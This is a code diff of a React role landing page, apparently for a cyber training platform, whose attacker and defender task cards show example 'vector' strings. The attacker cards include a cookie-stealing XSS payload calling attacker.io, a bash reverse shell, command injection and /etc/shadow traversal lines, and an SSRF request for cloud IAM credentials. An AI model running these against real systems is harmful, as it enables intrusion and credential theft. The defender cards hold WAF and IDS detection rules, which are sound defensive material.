@@ -9,17 +9,17 @@ import './StickyGridScroll.css';
 
 gsap.registerPlugin(ScrollTrigger);
 
-// 9 Tactical Mission Tasks for Attacker
+// 12 Tactical Mission Tasks for Attacker (3 columns x 4 rows)
 const ATTACKER_TASKS = [
   {
     id: 'sqli',
     title: 'SQL Injection',
-    badge: 'Critical Exploit',
+    badge: 'Database Exploit',
     desc: 'Extract database credentials and dump unauthorized schema tables via tainted query inputs.',
     vector: "UNION SELECT null, username, password FROM users WHERE '1'='1' --",
     details: 'Inject unescaped SQL syntax into authentication forms and search endpoints to bypass hash checks and extract administrative privileges.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <ellipse cx="12" cy="5" rx="9" ry="3" />
         <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
         <path d="M3 5v14c0 1.66 4 3 9 3 2.1 0 4.02-.24 5.5-.66" />
@@ -31,12 +31,12 @@ const ATTACKER_TASKS = [
   {
     id: 'xss',
     title: 'Cross-Site Scripting',
-    badge: 'High Impact',
+    badge: 'Session Hijack',
     desc: 'Inject stored and reflected JavaScript payloads to hijack active operator sessions.',
     vector: '<script>fetch("//attacker.io/c?"+document.cookie)</script>',
     details: 'Leverage unencoded HTML output to execute client-side scripts, steal authentication tokens, and deface target interface layouts.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <polyline points="16 18 22 12 16 6" />
         <polyline points="8 6 2 12 8 18" />
         <line x1="12" y1="2" x2="12" y2="22" />
@@ -52,7 +52,7 @@ const ATTACKER_TASKS = [
     vector: 'Hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form',
     details: 'Deploy multi-threaded password spraying against unprotected login portals without rate-limiting or CAPTCHA defenses.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
         <path d="M7 11V7a5 5 0 0 1 9.9-1" />
         <circle cx="12" cy="16" r="1.5" />
@@ -62,12 +62,12 @@ const ATTACKER_TASKS = [
   {
     id: 'cmd-injection',
     title: 'Command Injection',
-    badge: 'Critical Remote Code',
+    badge: 'Remote Code Execution',
     desc: 'Execute arbitrary host system instructions directly through vulnerable server parameters.',
     vector: '; cat /etc/passwd; id; uname -a',
-    details: 'Chain system commands via shell metacharacters through ping or diagnostic endpoints to spawn background reverse shells.',
+    details: 'Chain system commands via shell metacharacters through diagnostic endpoints to spawn background reverse shells.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <polyline points="4 17 10 11 4 5" />
         <line x1="12" y1="19" x2="20" y2="19" />
         <circle cx="17" cy="7" r="3" />
@@ -82,7 +82,7 @@ const ATTACKER_TASKS = [
     vector: 'find / -perm -4000 -type f 2>/dev/null; pkexec /bin/sh',
     details: 'Enumerate misconfigured sudo rules, weak permissions, and cron scripts to transition from unprivileged daemon user to superuser.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
         <path d="M12 11v6" />
         <path d="m9 14 3-3 3 3" />
@@ -92,12 +92,12 @@ const ATTACKER_TASKS = [
   {
     id: 'traversal',
     title: 'Directory Traversal',
-    badge: 'Information Disclosure',
+    badge: 'File Disclosure',
     desc: 'Traverse restricted file system directories to read server configuration and private keys.',
     vector: 'GET /download.php?file=../../../../etc/shadow HTTP/1.1',
     details: 'Bypass document root containment using relative dot-dot-slash path sequences to access internal source files and database configs.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" />
         <path d="m14 12-4 4" />
         <path d="m10 12 4 4" />
@@ -112,7 +112,7 @@ const ATTACKER_TASKS = [
     vector: '<img src="http://bank.internal/transfer?amt=50000&to=attacker">',
     details: 'Exploit missing CSRF tokens or insecure SameSite cookie policies to execute account password updates and privilege elevation.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
         <circle cx="9" cy="7" r="4" />
         <line x1="19" y1="8" x2="19" y2="14" />
@@ -123,12 +123,12 @@ const ATTACKER_TASKS = [
   {
     id: 'recon',
     title: 'Network Port Recon',
-    badge: 'Reconnaissance',
+    badge: 'Surface Discovery',
     desc: 'Map open ports, daemon fingerprints, and exposed internal service surfaces.',
     vector: 'nmap -sS -sV -p- -T4 --script vuln 10.0.0.1/24',
     details: 'Perform non-intrusive SYN stealth scans to map reachable TCP/UDP services, banner versions, and unauthenticated management consoles.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <circle cx="12" cy="12" r="10" />
         <path d="m4.93 4.93 4.24 4.24" />
         <path d="m14.83 9.17 4.24-4.24" />
@@ -145,101 +145,131 @@ const ATTACKER_TASKS = [
     vector: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1',
     details: 'Maintain persistent command-and-control access via obfuscated reverse shell sessions routed through standard egress ports.',
     svg: (
-      <svg className="w-8 h-8 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <circle cx="12" cy="12" r="9" />
         <path d="M9 10h.01" />
         <path d="M15 10h.01" />
-        <path d="M8 16c1.5-1 3.5-1 5 0" />
+        <path d="M9.5 15.5a3.5 3.5 0 0 0 5 0" />
         <path d="M12 2v3" />
-        <path d="M12 19v3" />
+      </svg>
+    )
+  },
+  {
+    id: 'bof',
+    title: 'Buffer Overflow',
+    badge: 'Memory Corruption',
+    desc: 'Smash execution stack pointers to redirect control flow into custom shellcode buffers.',
+    vector: 'python3 -c "print(\'A\'*112 + \'\\xef\\xbe\\xad\\xde\')" | ./vulnerable_bin',
+    details: 'Inject structured overflow strings to overwrite register EIP/RIP with shellcode return addresses.',
+    svg: (
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <rect x="2" y="6" width="20" height="12" rx="2" />
+        <path d="M6 12h4" />
+        <path d="M14 12h4" />
+        <path d="m10 9 4 6" />
+      </svg>
+    )
+  },
+  {
+    id: 'ssrf',
+    title: 'Server-Side Request Forgery',
+    badge: 'Cloud Pivot',
+    desc: 'Force backend hosts to query cloud metadata services (169.254.169.254) and internal APIs.',
+    vector: 'http://victim.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+    details: 'Pivot through vulnerable webhook endpoints to exfiltrate temporary AWS IAM tokens and internal cluster service accounts.',
+    svg: (
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z" />
+        <path d="m12 12-2 2 2 2" />
+      </svg>
+    )
+  },
+  {
+    id: 'kerberoast',
+    title: 'Active Directory Kerberoasting',
+    badge: 'Domain Compromise',
+    desc: 'Request service tickets (TGS) for SPNs and crack encrypted service account hashes offline.',
+    vector: 'GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.local/user:password -outputfile hashes.txt',
+    details: 'Target service accounts with weak passwords registered under Service Principal Names to achieve full domain administrator takeover.',
+    svg: (
+      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" />
+        <line x1="4" y1="22" x2="4" y2="15" />
       </svg>
     )
   }
 ];
 
-// 9 Tactical Mission Tasks for Defender
+// 12 Tactical Defense Tasks for Defender (3 columns x 4 rows)
 const DEFENDER_TASKS = [
   {
-    id: 'siem',
-    title: 'SIEM Log Telemetry',
-    badge: 'Detection Priority',
-    desc: 'Correlate authentication and proxy access logs to pinpoint active anomaly spikes.',
-    vector: 'fail2ban-client status; grep "401 Unauthorized" /var/log/auth.log',
-    details: 'Aggregate real-time access telemetry across web gateways and endpoints to detect credential spraying and anomalous origin traffic.',
+    id: 'ddos',
+    title: 'DDoS Mitigation',
+    badge: 'Traffic Scrubbing',
+    desc: 'Filter volumetric flood vectors and SYN floods at edge proxies using rate-limiting filters.',
+    vector: 'iptables -A INPUT -p tcp --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT',
+    details: 'Deploy BGP Anycast routing and automated packet scrubbing centers to neutralize high-bandwidth UDP amplification attacks.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M3 3v18h18" />
-        <path d="m19 9-5 5-4-4-3 3" />
-        <circle cx="19" cy="9" r="2" />
-      </svg>
-    )
-  },
-  {
-    id: 'waf',
-    title: 'WAF Filter Rules',
-    badge: 'Perimeter Defense',
-    desc: 'Deploy regex inspection filters to detect and discard malicious SQLi and XSS probes.',
-    vector: 'SecRule REQUEST_URI "@rx (union.*select|script)" "id:1001,deny,status:403"',
-    details: 'Configure ModSecurity and Cloud Armor Web Application Firewall rulesets to drop hostile payloads before reaching application containers.',
-    svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
         <path d="m9 12 2 2 4-4" />
       </svg>
     )
   },
   {
-    id: 'ids',
-    title: 'Intrusion Detection (IDS)',
-    badge: 'Traffic Inspection',
-    desc: 'Deep packet inspection tracking malformed TCP sequences and known exploit signatures.',
-    vector: 'suricata -c /etc/suricata/suricata.yaml -i eth0 --dump-pcap',
-    details: 'Inspect network interfaces with Snort/Suricata rules to alert on port sweeps, anomalous ICMP bursts, and shellcode buffers.',
+    id: 'waf',
+    title: 'WAF Rule Formulation',
+    badge: 'Layer 7 Filter',
+    desc: 'Inspect inbound HTTP payloads in real-time, blocking malicious regular expressions.',
+    vector: 'SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/ "(?:^|[^\w])(?:union\s+select)" "id:1001,phase:2,deny,status:403"',
+    details: 'Configure ModSecurity Core Rule Set filters to inspect URI arguments and headers, stopping OWASP Top 10 exploits.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M12 2a10 10 0 1 0 10 10" />
-        <path d="m21.5 2.5-9.5 9.5" />
-        <circle cx="12" cy="12" r="3" />
-      </svg>
-    )
-  },
-  {
-    id: 'patching',
-    title: 'Patch & Hardening',
-    badge: 'System Hardening',
-    desc: 'Remediate zero-day CVEs, close inactive ports, and harden daemon configurations.',
-    vector: 'apt-get update && apt-get --only-upgrade install openssl nginx',
-    details: 'Audit system libraries for vulnerable versions, disable dangerous PHP functions (`exec`, `system`), and restrict root SSH access.',
-    svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z" />
-      </svg>
-    )
-  },
-  {
-    id: 'isolation',
-    title: 'Incident Containment',
-    badge: 'Emergency Response',
-    desc: 'Quarantine compromised container instances and isolate affected network segments.',
-    vector: 'docker stop target_c1; iptables -A FORWARD -s 172.18.0.5 -j DROP',
-    details: 'Instantly isolate compromised workloads from the local bridge network while taking forensic memory snapshots for offline review.',
-    svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <rect width="18" height="18" x="3" y="3" rx="2" />
-        <line x1="9" y1="9" x2="15" y2="15" />
-        <line x1="15" y1="9" x2="9" y2="15" />
+        <path d="M3 9h18" />
+        <path d="M9 21V9" />
       </svg>
     )
   },
   {
-    id: 'rbac',
-    title: 'Access Control (RBAC)',
-    badge: 'Identity Security',
-    desc: 'Enforce least-privilege token policies, MFA requirements, and session revocations.',
-    vector: 'REVOKE ALL ON database.* FROM "guest"@"%"; FLUSH PRIVILEGES;',
-    details: 'Define granular role hierarchies ensuring operators only hold access to approved training targets and monitoring dashboards.',
+    id: 'edr',
+    title: 'Endpoint Telemetry',
+    badge: 'EDR Auditing',
+    desc: 'Stream kernel system call events and detect unauthorized process spawns across hosts.',
+    vector: 'auditctl -a always,exit -F arch=b64 -S execve -k process_audit',
+    details: 'Monitor process creation trees, unexpected DLL injection, and memory allocation hooks to instantly identify living-off-the-land techniques.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <rect width="20" height="14" x="2" y="3" rx="2" />
+        <line x1="8" y1="21" x2="16" y2="21" />
+        <line x1="12" y1="17" x2="12" y2="21" />
+        <path d="m7 10 2 2 4-4" />
+      </svg>
+    )
+  },
+  {
+    id: 'siem',
+    title: 'SIEM Correlation',
+    badge: 'Threat Intelligence',
+    desc: 'Aggregate disparate audit streams into centralized query clusters for anomaly detection.',
+    vector: 'index=security_logs sourcetype=auth_fail | stats count by user, src_ip | where count > 10',
+    details: 'Synthesize authentication, firewall, and DNS queries into dynamic risk scores to alert Security Operations Centers of active intrusions.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M3 3v18h18" />
+        <path d="m19 9-5 5-4-4-3 3" />
+      </svg>
+    )
+  },
+  {
+    id: 'iam',
+    title: 'Zero Trust Access',
+    badge: 'Identity Perimeter',
+    desc: 'Enforce hardware-bound FIDO2 authentication and contextual access control verification.',
+    vector: 'policy.enforce({ identity: user.fido2_verified, posture: host.compliant, ip: allowed_range })',
+    details: 'Eliminate implicit network trust by validating certificate-based authentication and device posture on every microservice transaction.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <circle cx="12" cy="7" r="4" />
         <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" />
         <path d="m16 11 2 2 4-4" />
@@ -247,50 +277,108 @@ const DEFENDER_TASKS = [
     )
   },
   {
-    id: 'vuln-scan',
-    title: 'Vulnerability Audit',
-    badge: 'Proactive Audit',
-    desc: 'Continuous automated auditing of attack surfaces, TLS configs, and dependencies.',
-    vector: 'trivy image target_app:latest; nikto -h http://localhost:8080',
-    details: 'Scan live endpoints and container image layers for known vulnerabilities, expired certificates, and misconfigured HTTP headers.',
+    id: 'hsm',
+    title: 'Cryptographic Key Vault',
+    badge: 'HSM Protection',
+    desc: 'Enforce AES-256 GCM envelope encryption with hardware security module root of trust.',
+    vector: 'openssl enc -aes-256-gcm -pbkdf2 -iter 100000 -in secret.dat -out secret.enc',
+    details: 'Safeguard database secrets, SSL private keys, and API tokens inside tamper-resistant hardware security modules with automated 90-day rotation.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="12" cy="12" r="10" />
-        <line x1="22" y1="12" x2="18" y2="12" />
-        <line x1="6" y1="12" x2="2" y2="12" />
-        <line x1="12" y1="6" x2="12" y2="2" />
-        <line x1="12" y1="22" x2="12" y2="18" />
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M21 2l-2 2m-1-1l-3 3m5 8h-4l-2 4H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h8l2 4h5a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2z" />
       </svg>
     )
   },
   {
-    id: 'threat-intel',
-    title: 'Threat Intel Feed',
-    badge: 'Adversary Profiling',
-    desc: 'Ingest real-time adversary tactics (MITRE ATT&CK), CVE databases, and hostile IP pools.',
-    vector: 'curl -s https://intel.cyberforge.local/api/feed/ioc | jq .',
-    details: 'Synchronize dynamic blocklists with active threat intelligence feeds to preemptively block adversary infrastructure and C2 servers.',
+    id: 'honeypot',
+    title: 'Honeypot Decoy Grid',
+    badge: 'Deception Tech',
+    desc: 'Deploy low-interaction decoy services to bait, log, and profile adversary techniques.',
+    vector: 'cowrie start --listen 0.0.0.0:2222 --banner "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"',
+    details: 'Lure automated scanners and opportunistic threat actors into isolated deceptive sandbox instances for high-fidelity attribution.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-        <circle cx="12" cy="12" r="10" />
-        <line x1="2" y1="12" x2="22" y2="12" />
-        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M10 2v2" />
+        <path d="M14 2v2" />
+        <path d="M16 8a4 4 0 0 1-8 0V6h8z" />
+        <path d="M6 10v10a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V10" />
+      </svg>
+    )
+  },
+  {
+    id: 'nids',
+    title: 'Packet Deep Inspection',
+    badge: 'Network IDS',
+    desc: 'Run multi-gigabit traffic inspection against signature rulesets (Suricata / Snort).',
+    vector: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"ET WEB_SPECIFIC_APPS SQLi"; content:"UNION SELECT"; sid:2000001;)',
+    details: 'Decouple network flows into stateful protocol reassembly engines to identify C2 beacons, DNS tunneling, and exploit shellcode in real-time.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <rect x="2" y="4" width="20" height="8" rx="2" />
+        <rect x="2" y="14" width="20" height="6" rx="2" />
+        <line x1="6" y1="8" x2="6.01" y2="8" />
+        <line x1="10" y1="8" x2="10.01" y2="8" />
+      </svg>
+    )
+  },
+  {
+    id: 'soar',
+    title: 'SOAR Auto-Quarantine',
+    badge: 'Response Automation',
+    desc: 'Automatically isolate compromised host nodes and revoke session tokens in milliseconds.',
+    vector: 'soar.trigger("quarantine_host", { ip: alert.src_ip, revoke_token: alert.user_session })',
+    details: 'Execute programmatic containment scripts upon high-severity alerts to sever outbound connections and dump memory for forensic analysis.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
+      </svg>
+    )
+  },
+  {
+    id: 'aslr',
+    title: 'Memory Protection',
+    badge: 'Binary Hardening',
+    desc: 'Enforce Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).',
+    vector: 'echo 2 > /proc/sys/kernel/randomize_va_space',
+    details: 'Randomize memory page locations of the program stack, heap, and libraries to prevent reliable return-oriented programming (ROP) exploits.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
+        <line x1="12" y1="8" x2="12" y2="12" />
+        <line x1="12" y1="16" x2="12.01" y2="16" />
+      </svg>
+    )
+  },
+  {
+    id: 'microseg',
+    title: 'Network Microsegmentation',
+    badge: 'Perimeter Defense',
+    desc: 'Isolate sensitive database tiers from web tiers using granular Calico and eBPF policies.',
+    vector: 'apiVersion: projectcalico.org/v3 kind: NetworkPolicy spec: selector: app == "db" ingress: - action: Allow source: selector: app == "api"',
+    details: 'Confine workloads to least-privilege egress and ingress network rules, preventing lateral movement during active breaches.',
+    svg: (
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+        <circle cx="6" cy="6" r="3" />
+        <circle cx="18" cy="18" r="3" />
+        <line x1="8.59" y1="8.59" x2="15.42" y2="15.42" />
+        <circle cx="18" cy="6" r="3" />
+        <circle cx="6" cy="18" r="3" />
       </svg>
     )
   },
   {
     id: 'forensics',
-    title: 'Digital Forensics',
-    badge: 'Evidence Audit',
-    desc: 'Reconstruct adversary timelines through disk artifact extraction and memory dumps.',
-    vector: 'volatility -f mem.dmp --profile=Linux6x64 linux_pslist',
-    details: 'Capture non-volatile evidence and analyze memory artifacts to determine initial infection vectors and lateral movement timelines.',
+    title: 'Forensic Memory Triage',
+    badge: 'Incident Analysis',
+    desc: 'Acquire raw volatility dumps to extract active injected DLLs and unencrypted C2 keys.',
+    vector: 'vol.py -f memory.raw windows.malfind.Malfind',
+    details: 'Perform post-incident triage on memory dumps to reconstruct attacker persistence mechanisms, timestamps, and exfiltrated payloads.',
     svg: (
-      <svg className="w-8 h-8 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
         <circle cx="11" cy="11" r="8" />
         <line x1="21" y1="21" x2="16.65" y2="16.65" />
-        <path d="M11 8v6" />
-        <path d="M8 11h6" />
+        <line x1="11" y1="8" x2="11" y2="14" />
+        <line x1="8" y1="11" x2="14" y2="11" />
       </svg>
     )
   }
@@ -300,7 +388,6 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
   const isAttacker = role === 'attacker';
   const tasks = isAttacker ? ATTACKER_TASKS : DEFENDER_TASKS;
 
-  const [boomProgress, setBoomProgress] = useState(0);
   const [selectedTask, setSelectedTask] = useState(null);
 
   const introRef = useRef(null);
@@ -313,11 +400,11 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
   const gridRef = useRef(null);
 
   useEffect(() => {
-    // 1. Initialize Lenis Smooth Scrolling
+    // 1. Initialize Lenis Smooth Scrolling (exact Codrops parameters)
     const lenis = new Lenis({
       lerp: 0.08,
-      wheelMultiplier: 1.2,
-      smoothTouch: true
+      wheelMultiplier: 1.4,
+      smoothWheel: true
     });
 
     lenis.on('scroll', ScrollTrigger.update);
@@ -328,19 +415,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
     gsap.ticker.add(tickerCb);
     gsap.ticker.lagSmoothing(0);
 
-    // 2. Scroll-driven Particle Explosion
-    // When scrolling down past the intro, boomProgress goes from 0 to 1
-    const particleTrigger = ScrollTrigger.create({
-      trigger: introRef.current,
-      start: 'top top',
-      end: 'bottom top',
-      scrub: true,
-      onUpdate: (self) => {
-        setBoomProgress(self.progress);
-      }
-    });
-
-    // 3. Sticky Grid Scroll Parallax & Zoom Implementation
+    // 2. Query DOM elements
     const blockEl = mainBlockRef.current;
     const wrapperEl = wrapperRef.current;
     const contentEl = contentRef.current;
@@ -354,13 +429,14 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       items = Array.from(gridEl.querySelectorAll('.gallery__item'));
     }
 
-    // Distribute items into 3 columns
-    const columns = [[], [], []];
+    // 3. Distribute items into 3 columns (4 items each)
+    const numColumns = 3;
+    const columns = Array.from({ length: numColumns }, () => []);
     items.forEach((item, index) => {
-      columns[index % 3].push(item);
+      columns[index % numColumns].push(item);
     });
 
-    // Initial content state: hide desc and button, center title
+    // 4. Initial Content State (exact Codrops logic)
     let titleOffsetY = 0;
     if (descEl && buttonEl) {
       gsap.set([descEl, buttonEl], { opacity: 0, pointerEvents: 'none' });
@@ -371,7 +447,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       gsap.set(titleEl, { yPercent: titleOffsetY });
     }
 
-    // Parallax on wrapper
+    // 5. Parallax on Wrapper (exact Codrops implementation)
     const parallaxTrigger = gsap.from(wrapperEl, {
       yPercent: -100,
       ease: 'none',
@@ -383,7 +459,7 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       }
     });
 
-    // Animate title opacity
+    // 6. Animate Title Opacity
     const titleTrigger = gsap.from(titleEl, {
       opacity: 0,
       duration: 0.7,
@@ -395,16 +471,16 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       }
     });
 
-    // Grid Reveal Timeline
+    // 7. Grid Reveal Timeline (exact Codrops stagger & alternation)
     const wh = window.innerHeight;
-    const dy = wh - (wh - (gridEl?.offsetHeight || 600)) / 2;
+    const r = wh - (wh - (gridEl?.offsetHeight || 650)) / 2;
     const revealTimeline = gsap.timeline();
     columns.forEach((column, colIndex) => {
       const fromTop = colIndex % 2 === 0;
       revealTimeline.from(
         column,
         {
-          y: dy * (fromTop ? -1 : 1),
+          y: r * (fromTop ? -1 : 1),
           stagger: {
             each: 0.06,
             from: fromTop ? 'end' : 'start'
@@ -415,18 +491,18 @@ export default function RoleLandingPage({ role = 'attacker', email = '', onSignO
       );
     });
 
-    // Grid Zoom Timeline
+    // 8. Grid Zoom Timeline (exact Codrops scale 2.05 & split)
     const zoomTimeline = gsap.timeline({ defaults: { duration: 1, ease: 'power3.inOut' } });
     if (gridEl) {
-      zoomTimeline.to(gridEl, { scale: 1.85 });
+      zoomTimeline.to(gridEl, { scale: 2.05 });
     }
-    if (columns[0].length) zoomTimeline.to(columns[0], { xPercent: -35 }, '<');
-    if (columns[2].length) zoomTimeline.to(columns[2], { xPercent: 35 }, '<');
+    if (columns[0].length) zoomTimeline.to(columns[0], { xPercent: -40 }, '<');
